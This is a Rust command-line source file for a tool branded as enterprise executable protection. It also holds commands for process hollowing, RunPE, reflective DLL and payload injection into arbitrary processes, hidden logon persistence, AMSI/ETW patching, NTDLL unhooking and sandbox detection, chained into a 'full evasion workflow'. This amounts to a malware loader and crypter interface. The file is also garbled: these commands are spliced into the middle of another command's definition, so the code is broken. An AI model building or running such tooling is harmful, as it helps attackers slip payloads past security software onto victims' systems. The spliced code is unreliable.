use clap::{Parser, Subcommand};
use reapershield_analyzer::{PeAnalyzer, PeReport};
use reapershield_crypto::CryptoAlgorithm;
use reapershield_hardening::HardeningConfig;
use reapershield_obfuscation::ObfuscationConfig;
use reapershield_packer::{CompressionMethod, Packer, PackedBundle};
use reapershield_reports::{AuditReport, ReportGenerator};
use reapershield_sdk::{ProtectionPipelineConfig, ReaperShieldSdk};
use reapershield_telemetry::TelemetryManager;
use reapershield_evasion::{
    ProcessHollower, ReflectiveLoader, PersistenceEngine, AvEdrBypass,
    SandboxEvasion, InjectionFramework, EvasionEngine,
    RunPeConfig, ReflectiveLoaderConfig, PersistenceConfig, PersistenceTechnique,
    BypassConfig, EvasionConfig, InjectionConfig, InjectionMethod,
};

use std::path::{Path, PathBuf};

#[derive(Parser, Debug)]
#[command(name = "reapershield")]
#[command(author = "ReaperShield Team")]
#[command(version = "0.1.0")]
#[command(about = "ReaperShield Enterprise Executable Protection Platform CLI", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Analyze a Windows executable (PE) file for structural security indicators
    Analyze {
        /// Path to the target PE executable
        #[arg(required = true)]
        file: PathBuf,

        /// Output the structural report as raw JSON instead of pretty console layout
        #[arg(long, default_value_t = false)]
        json: bool,
    },

    /// Apply comprehensive, multi-layered enterprise protection to a binary
    Protect {
        /// Path to the source executable
        #[arg(required = true)]
        input: PathBuf,

        /// Path to write the protected executable
        #[arg(long, short)]
        output: Option<PathBuf>,

        /// Password/key for encrypting internal resources and packing payloads
        #[arg(long, short)]
        passphrase: Option<String>,

        /// Enable advanced string and symbol obfuscation
        #[arg(long, default_value_t = true)]
        obfuscate: bool,

        /// Inject anti-tamper runtime checksums
        #[arg(long, default_value_t = true)]
        hardening: bool,

        /// Choose compression strategy (none, zstd, lzma)
        #[arg(long, default_value_t = String::from("zstd"))]
        compression: String,
    },

    /// Apply isolated structural code and layout obfuscation to a binary
    Obfuscate {
        /// Path to the target binary
        #[arg(required = true)]
        file: PathBuf,

        /// Prefix to use when renaming standard PE sections
        #[arg(long, default_value_t = String::from(".reap"))]
        prefix: String,

        /// Add non-crashing CPU junk instruction segments
        #[arg(long, default_value_t = true)]
        junk: bool,

        /// Size in bytes of junk code to inject
        #[arg(long, default_value_t = 512)]
        junk_size: usize,
    },

    /// High-ratio asset packaging utility
    Pack {
        /// Path to the target directory containing asset files to compress and pack
        #[arg(required = true)]
        directory: PathBuf,

        /// Output package archive path (.reapack)
        #[arg(long, short)]
        output: PathBuf,

        /// Compression strategy (zstd, lzma)
        #[arg(long, default_value_t = String::from("zstd"))]
        compression: String,

        /// Passphrase to securely encrypt the packed bundle
        #[arg(long)]
        passphrase: Option<String>,
    },

    /// Generate an HTML and JSON audit report for a binary
    Report {
        /// Path to the target executable
        #[arg(required = true)]

    /// Evasion: Process Hollowing - execute payload in suspended process
    EvasionHollow {
        /// Target executable to hollow
        #[arg(required = true)]
        target: PathBuf,

        /// Payload PE file path
        #[arg(required = true)]
        payload: PathBuf,
    },

    /// Evasion: RunPE - classic PE injection
    EvasionRunpe {
        /// Target executable
        #[arg(required = true)]
        target: PathBuf,

        /// Payload PE file path
        #[arg(required = true)]
        payload: PathBuf,
    },

    /// Evasion: Reflective Loader - manual PE mapping
    EvasionReflective {
        /// Payload PE file path
        #[arg(required = true)]
        payload: PathBuf,

        /// Call entry point after loading
        #[arg(long, default_value_t = true)]
        execute: bool,

        /// Wipe PE headers from memory
        #[arg(long, default_value_t = true)]
        wipe_headers: bool,
    },

    /// Evasion: Reflective DLL Injection
    EvasionReflectiveDll {
        /// Target process PID
        #[arg(required = true)]
        pid: u32,

        /// DLL file path
        #[arg(required = true)]
        dll: PathBuf,
    },

    /// Evasion: Add Persistence
    EvasionPersist {
        /// Target executable path
        #[arg(required = true)]
        target: PathBuf,

        /// Artifact name
        #[arg(required = true)]
        name: String,

        /// Technique (registry_run, registry_runonce, startup_folder, windows_service)
        #[arg(required = true)]
        technique: String,
    },

    /// Evasion: AV/EDR Bypass
    EvasionBypass {
        /// Unhook NTDLL from disk
        #[arg(long, default_value_t = true)]
        unhook_ntdll: bool,

        /// Patch AMSI
        #[arg(long, default_value_t = true)]
        patch_amsi: bool,

        /// Patch ETW
        #[arg(long, default_value_t = true)]
        patch_etw: bool,
    },

    /// Evasion: Sandbox Detection
    EvasionSandbox {
        /// Check CPU count
        #[arg(long, default_value_t = true)]
        check_cpu: bool,

        /// Check memory
        #[arg(long, default_value_t = true)]
        check_memory: bool,

        /// Check disk size
        #[arg(long, default_value_t = true)]
        check_disk: bool,
    },

    /// Evasion: Payload Injection
    EvasionInject {
        /// Target process PID
        #[arg(required = true)]
        pid: u32,

        /// Payload file path
        #[arg(required = true)]
        payload: PathBuf,

        /// Method (classic_dll, apc, thread_hijacking, process_doppelganging)
        #[arg(required = true)]
        method: String,
    },

    /// Evasion: Full Evasion Workflow
    EvasionFull {
        /// Target executable
        #[arg(required = true)]
        target: PathBuf,

        /// Payload file path
        #[arg(required = true)]
        payload: PathBuf,

        /// Enable process hollowing
        #[arg(long, default_value_t = true)]
        hollowing: bool,

        /// Enable persistence
        #[arg(long, default_value_t = true)]
        persistence: bool,

        /// Enable AV/EDR bypass
        #[arg(long, default_value_t = true)]
        bypass: bool,
    },
        file: PathBuf,

        /// Output directory for audit reports
        #[arg(long, short)]
        out_dir: Option<PathBuf>,
    },
}

fn main() -> anyhow::Result<()> {
    // Standard setup
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();

    let args = Cli::parse();

    match args.command {
        Commands::Analyze { file, json } => {
            if !file.exists() {
                anyhow::bail!("Error: File does not exist at path {:?}", file);
            }

            println!("[*] Analyzing structural security indicators of PE binary: {:?}", file);
            let report = PeAnalyzer::analyze_file(&file)?;

            if json {
                println!("{}", serde_json::to_string_pretty(&report)?);
            } else {
                print_pretty_report(&report);
            }
        }

        Commands::Protect {
            input,
            output,
            passphrase,
            obfuscate,
            hardening,
            compression,
        } => {
            if !input.exists() {
                anyhow::bail!("Error: Input file does not exist at path {:?}", input);
            }

            let out_file = output.unwrap_or_else(|| {
                let stem = input.file_stem().unwrap_or_default().to_string_lossy();
                let ext = input.extension().unwrap_or_default().to_string_lossy();
                input.parent().unwrap_or(Path::new(".")).join(format!("{}_protected.{}", stem, ext))
            });

            let comp_method = match compression.to_lowercase().as_str() {
                "lzma" => CompressionMethod::Lzma,
                "zstd" => CompressionMethod::Zstd,
                _ => CompressionMethod::None,
            };

            let config = ProtectionPipelineConfig {
                obfuscation: ObfuscationConfig {
                    encrypt_strings: obfuscate,
                    xor_key: 0x5C,
                    rename_sections: obfuscate,
                    section_prefix: ".reap".to_string(),
                    generate_junk_instructions: obfuscate,
                    junk_size: 512,
                    diversify_layout: obfuscate,
                },
                hardening: HardeningConfig {
                    force_dep: hardening,
                    force_aslr: hardening,
                    force_high_entropy_aslr: hardening,
                    force_cfg: hardening,
                    force_integrity_check: hardening,
                    inject_anti_tamper: hardening,
                },
                compression: comp_method,
                encrypt_assets: passphrase.is_some(),
                encryption_algorithm: CryptoAlgorithm::Aes256Gcm,
                generate_reports: true,
            };

            println!("[*] Running ReaperShield Protection Pipeline on {:?}", input);
            println!("[*] Output destination configured as {:?}", out_file);

            let summary = ReaperShieldSdk::protect_binary(
                &input,
                &out_file,
                &config,
                passphrase.as_ref().map(|s| s.as_bytes()),
            )?;

            println!("\n==================================================");
            println!("   ReaperShield Protection Sequence Successful!   ");
            println!("==================================================");
            println!("Original Binary Size:  {} bytes", summary.original_size);
            println!("Protected Binary Size: {} bytes", summary.protected_size);
            println!("Security Score Shift:  {}% -> {}%", summary.initial_security_score, summary.protected_security_score);
            println!("Total Elapsed Time:    {} ms", summary.elapsed_ms);
            println!("Generated Reports:");
            for r_path in &summary.report_paths {
                println!("  - {:?}", r_path);
            }
            println!("==================================================");
        }

        Commands::Obfuscate { file, prefix, junk, junk_size } => {
            if !file.exists() {
                anyhow::bail!("Error: Target file does not exist at path {:?}", file);
            }

            println!("[*] Applying isolated binary obfuscation filters to: {:?}", file);
            let buffer = std::fs::read(&file)?;
            
            let mut out_buffer = buffer;
            if !prefix.is_empty() {
                println!("[*] Renaming PE sections with prefix: '{}'", prefix);
                out_buffer = reapershield_obfuscation::ObfuscationEngine::rename_pe_sections(&out_buffer, &prefix)?;
            }

            if junk && junk_size > 0 {
                println!("[*] Injecting x86/x64 non-crashing assembly junk code ({} bytes)", junk_size);
                let junk_code = reapershield_obfuscation::ObfuscationEngine::generate_junk_instructions(junk_size);
                out_buffer = reapershield_pe_engine::PeEngine::inject_section(
                    &out_buffer,
                    ".reajnk",
                    &junk_code,
                    0x6000_0020, // RX code Characteristics
                )?;
            }

            let output_path = file.parent().unwrap_or(Path::new(".")).join(format!(
                "{}_obfuscated.exe",
                file.file_stem().unwrap_or_default().to_string_lossy()
            ));

            std::fs::write(&output_path, &out_buffer)?;
            println!("[+] Successfully completed obfuscated binary build: {:?}", output_path);
        }

        Commands::Pack { directory, output, compression, passphrase } => {
            if !directory.exists() || !directory.is_dir() {
                anyhow::bail!("Error: Source path must be a valid directory containing assets. Location: {:?}", directory);
            }

            println!("[*] Indexing files inside asset folder: {:?}", directory);
            let mut files_to_pack = Vec::new();

            fn collect_files(dir: &Path, base_dir: &Path, list: &mut Vec<(PathBuf, String)>) -> std::io::Result<()> {
                if dir.is_dir() {
                    for entry in std::fs::read_dir(dir)? {
                        let entry = entry?;
                        let path = entry.path();
                        if path.is_dir() {
                            collect_files(&path, base_dir, list)?;
                        } else {
                            let rel_path = path.strip_prefix(base_dir).unwrap().to_string_lossy().into_owned();
                            list.push((path, rel_path));
                        }
                    }
                }
                Ok(())
            }

            collect_files(&directory, &directory, &mut files_to_pack)?;

            if files_to_pack.is_empty() {
                anyhow::bail!("Error: Asset directory is empty.");
            }

            let comp_method = match compression.to_lowercase().as_str() {
                "lzma" => CompressionMethod::Lzma,
                "zstd" => CompressionMethod::Zstd,
                _ => CompressionMethod::None,
            };

            println!("[*] Bundling {} files using {:?}", files_to_pack.len(), comp_method);
            let bundle = Packer::create_bundle(&files_to_pack, comp_method)?;

            let out_bytes = if let Some(pass) = passphrase {
                println!("[*] Encrypting resource bundle with AES-256-GCM...");
                let asset = Packer::encrypt_bundle(&bundle, pass.as_bytes(), CryptoAlgorithm::Aes256Gcm)?;
                asset.to_bytes()?
            } else {
                serde_json::to_vec(&bundle)?
            };

            std::fs::write(&output, &out_bytes)?;
            println!("[+] Secure assets bundle written to: {:?}", output);
        }

        Commands::Report { file, out_dir } => {
            if !file.exists() {
                anyhow::bail!("Error: Target file does not exist at path {:?}", file);
            }

            println!("[*] Analyzing target binary: {:?}", file);
            let report = PeAnalyzer::analyze_file(&file)?;

            let target_directory = out_dir.unwrap_or_else(|| file.parent().unwrap_or(Path::new(".")).to_path_buf());
            let file_stem = file.file_stem().unwrap_or_default().to_string_lossy();

            let audit_report = AuditReport {
                report_id: uuid::Uuid::new_v4().to_string()[..8].to_uppercase(),
                created_at: chrono::Utc::now(),
                binary_report: report,
                telemetry_events: TelemetryManager::generate_mock_telemetry(),
                protection_applied: false,
                compression_ratio: None,
            };

            let html_path = target_directory.join(format!("{}_audit_report.html", file_stem));
            ReportGenerator::generate_html_report(&audit_report, &html_path)?;
            println!("[+] HTML audit report written to: {:?}", html_path);
        }

        Commands::EvasionHollow { target, payload } => {
            if !target.exists() || !payload.exists() {
                anyhow::bail!("Error: Target or payload file does not exist");
            }

            println!("[*] Process Hollowing: {:?} with payload {:?}", target, payload);
            let payload_data = std::fs::read(&payload)?;
            let result = ProcessHollower::hollow(&target.to_string_lossy(), &payload_data)?;
            println!("[+] Process hollowing successful!");
            println!("    PID: {}", result.pid);
            println!("    TID: {}", result.tid);
            println!("    Image Base: 0x{:X}", result.image_base);
            println!("    Entry Point: 0x{:X}", result.entry_point);
            println!("    Technique: {}", result.technique);
        }

        Commands::EvasionRunpe { target, payload } => {
            if !target.exists() || !payload.exists() {
                anyhow::bail!("Error: Target or payload file does not exist");
            }

            println!("[*] RunPE: {:?} with payload {:?}", target, payload);
            let payload_data = std::fs::read(&payload)?;
            let config = RunPeConfig {
                target_exe: target.to_string_lossy().to_string(),
                payload_path: payload.to_string_lossy().to_string(),
                create_suspended: true,
                unpatch_ntdll: true,
                randomize_dll_name: false,
            };
            let result = ProcessHollower::runpe(&config, &payload_data)?;
            println!("[+] RunPE successful!");
            println!("    PID: {}", result.pid);
            println!("    TID: {}", result.tid);
            println!("    Image Base: 0x{:X}", result.image_base);
            println!("    Entry Point: 0x{:X}", result.entry_point);
            println!("    Technique: {}", result.technique);
        }

        Commands::EvasionReflective { payload, execute, wipe_headers } => {
            if !payload.exists() {
                anyhow::bail!("Error: Payload file does not exist");
            }

            println!("[*] Reflective Loader: {:?}", payload);
            let payload_data = std::fs::read(&payload)?;
            let config = ReflectiveLoaderConfig {
                resolve_imports: true,
                apply_relocations: true,
                call_entry_point: execute,
                entry_point_arg: None,
                wipe_headers,
                erase_pe_signature: false,
            };
            let result = ReflectiveLoader::load(&payload_data, &config)?;
            println!("[+] Reflective load successful!");
            println!("    Entry Point: 0x{:X}", result.entry_point);
            println!("    Image Base: 0x{:X}", result.image_base);
            println!("    Image Size: {} bytes", result.image_size);
            println!("    Resolved Imports: {}", result.resolved_imports);
            println!("    Applied Relocations: {}", result.applied_relocations);
            println!("    Technique: {}", result.technique);
        }

        Commands::EvasionReflectiveDll { pid, dll } => {
            if !dll.exists() {
                anyhow::bail!("Error: DLL file does not exist");
            }

            println!("[*] Reflective DLL Injection into PID {} from {:?}", pid, dll);
            let dll_data = std::fs::read(&dll)?;
            let result = ReflectiveLoader::reflective_dll_inject(pid, &dll_data)?;
            println!("[+] Reflective DLL injection successful!");
            println!("    Remote Address: 0x{:X}", result.image_base);
            println!("    Technique: {}", result.technique);
        }

        Commands::EvasionPersist { target, name, technique } => {
            if !target.exists() {
                anyhow::bail!("Error: Target file does not exist");
            }

            println!("[*] Adding persistence: {:?} as {} using {}", target, name, technique);
            let tech = match technique.as_str() {
                "registry_run" => PersistenceTechnique::RegistryRun,
                "registry_runonce" => PersistenceTechnique::RegistryRunOnce,
                "startup_folder" => PersistenceTechnique::StartupFolder,
                "windows_service" => PersistenceTechnique::WindowsService,
                _ => anyhow::bail!("Unknown technique: {}", technique),
            };

            let config = PersistenceConfig {
                technique: tech,
                target_path: target.to_string_lossy().to_string(),
                artifact_name: name,
                execute_on: "logon".to_string(),
                hidden: true,
            };

            let result = PersistenceEngine::apply(&config)?;
            println!("[+] Persistence added successfully!");
            println!("    Technique: {}", result.technique);
            println!("    Location: {}", result.location);
            println!("    Artifact: {}", result.artifact);
        }

        Commands::EvasionBypass { unhook_ntdll, patch_amsi, patch_etw } => {
            println!("[*] AV/EDR Bypass");
            println!("    Unhook NTDLL: {}", unhook_ntdll);
            println!("    Patch AMSI: {}", patch_amsi);
            println!("    Patch ETW: {}", patch_etw);

            let config = BypassConfig {
                unhook_ntdll,
                unhook_kernel32: false,
                patch_amsi,
                patch_etw,
                use_syscall_stub: true,
                indirect_syscalls: false,
            };

            let result = AvEdrBypass::apply_bypasses(&config)?;
            println!("[+] AV/EDR bypass successful!");
            println!("    Bypassed Count: {}", result.bypassed_count);
            println!("    Details: {}", result.details);
        }

        Commands::EvasionSandbox { check_cpu, check_memory, check_disk } => {
            println!("[*] Sandbox Detection");
            let config = EvasionConfig {
                check_cpu_count: check_cpu,
                check_memory,
                check_disk_size: check_disk,
                check_registry_keys: true,
                check_mac_address: false,
                check_mouse_movement: false,
                check_sleep_acceleration: true,
            };

            let result = SandboxEvasion::detect_sandbox(&config)?;
            println!("[+] Sandbox detection complete!");
            println!("    Is Sandbox: {}", result.is_sandbox);
            println!("    Confidence: {:.2}%", result.confidence * 100.0);
            println!("    Detected Indicators:");
            for indicator in &result.detected_indicators {
                println!("      - {}", indicator);
            }
            println!("    Technique: {}", result.technique);
        }

        Commands::EvasionInject { pid, payload, method } => {
            if !payload.exists() {
                anyhow::bail!("Error: Payload file does not exist");
            }

            println!("[*] Payload Injection into PID {} using {}", pid, method);
            let payload_data = std::fs::read(&payload)?;
            let inj_method = match method.as_str() {
                "classic_dll" => InjectionMethod::ClassicDllInjection,
                "apc" => InjectionMethod::ApcInjection,
                "thread_hijacking" => InjectionMethod::ThreadHijacking,
                "process_doppelganging" => InjectionMethod::ProcessDoppelganging,
                _ => anyhow::bail!("Unknown method: {}", method),
            };

            let config = InjectionConfig {
                target_pid: pid,
                payload: payload_data,
                method: inj_method,
                execute: true,
            };

            let result = InjectionFramework::inject(&config)?;
            println!("[+] Payload injection successful!");
            println!("    Remote Address: 0x{:X}", result.remote_address);
            println!("    Thread ID: {:?}", result.thread_id);
            println!("    Technique: {}", result.technique);
        }

        Commands::EvasionFull { target, payload, hollowing, persistence, bypass } => {
            if !target.exists() || !payload.exists() {
                anyhow::bail!("Error: Target or payload file does not exist");
            }

            println!("[*] Full Evasion Workflow");
            println!("    Target: {:?}", target);
            println!("    Payload: {:?}", payload);
            println!("    Hollowing: {}", hollowing);
            println!("    Persistence: {}", persistence);
            println!("    Bypass: {}", bypass);

            let payload_data = std::fs::read(&payload)?;
            let result = EvasionEngine::execute_full_evasion(
                &target.to_string_lossy(),
                &payload_data,
                hollowing,
                persistence,
                bypass,
            )?;

            println!("[+] Full evasion workflow complete!");
            println!("    Timestamp: {}", result.timestamp);
            if let Some(h) = &result.hollowing {
                println!("    Hollowing: PID {}, TID {}", h.pid, h.tid);
            }
            if let Some(p) = &result.persistence {
                println!("    Persistence: {} at {}", p.technique, p.location);
            }
            if let Some(b) = &result.bypass {
                println!("    Bypass: {} bypassed", b.bypassed_count);
            }
            if let Some(s) = &result.sandbox_detection {
                println!("    Sandbox Detection: Is Sandbox={}, Confidence={:.2}%", s.is_sandbox, s.confidence * 100.0);
            }
        }
    }

    Ok(())
}

fn print_pretty_report(report: &PeReport) {
    println!("\n==================================================");
    println!("   ReaperShield Binary Security Analysis          ");
    println!("==================================================");
    println!("File Name:     {}", report.file_name);
    println!("File Size:     {} bytes", report.file_size);
    println!("Security Score: {}/100", report.security_score);
    println!("Architecture:   {}", if report.is_64_bit { "64-bit (x86_64)" } else { "32-bit (x86)" });
    println!("Entry Point:    0x{:08X}", report.entry_point);
    println!("Global Entropy: {:.4}", report.global_entropy);
    println!("Packer Status:  {}", if report.packer_detected { "PACKED / CRYPTED" } else { "NONE DETECTED" });
    println!("Digital Sign:   {}", if report.has_digital_signature { "SIGNED (VALID)" } else { "UNSIGNED" });
    
    println!("\n--- Active Exploit Mitigations ---");
    println!("DEP / NX Support:             {}", if report.mitigations.has_dep { "YES" } else { "NO" });
    println!("ASLR Support:                 {}", if report.mitigations.has_aslr { "YES" } else { "NO" });
    println!("High Entropy ASLR:            {}", if report.mitigations.has_high_entropy_aslr { "YES" } else { "NO" });
    println!("Control Flow Guard (CFG):     {}", if report.mitigations.has_cfg { "YES" } else { "NO" });
    println!("SafeSEH Exception Tables:     {}", if report.mitigations.has_safeseh { "YES" } else { "NO" });
    println!("Stack Buffer Protection (GS): {}", if report.mitigations.has_gs { "YES" } else { "NO" });

    println!("\n--- Section Layout Maps ({}) ---", report.sections.len());
    for sec in &report.sections {
        let perm_r = if sec.is_readable { "R" } else { "-" };
        let perm_w = if sec.is_writable { "W" } else { "-" };
        let perm_x = if sec.is_executable { "X" } else { "-" };
        println!(
            "  Name: {:<8} | RVA: 0x{:08X} | Raw Size: {:<8} bytes | Entropy: {:.2} | Perms: {}{}{} | Suspicious: {}",
            sec.name, sec.virtual_address, sec.raw_data_size, sec.entropy, perm_r, perm_w, perm_x, if sec.is_suspicious { "YES" } else { "NO" }
        );
    }

    if !report.security_issues.is_empty() {
        println!("\n--- Vulnerability and Compliance Alerts ---");
        for issue in &report.security_issues {
            println!("  [!] {}", issue);
        }
    } else {
        println!("\n--- Vulnerability and Compliance Alerts ---");
        println!("  [+] No compliance vulnerabilities or missing mitigations detected.");
    }
    println!("==================================================\n");
}
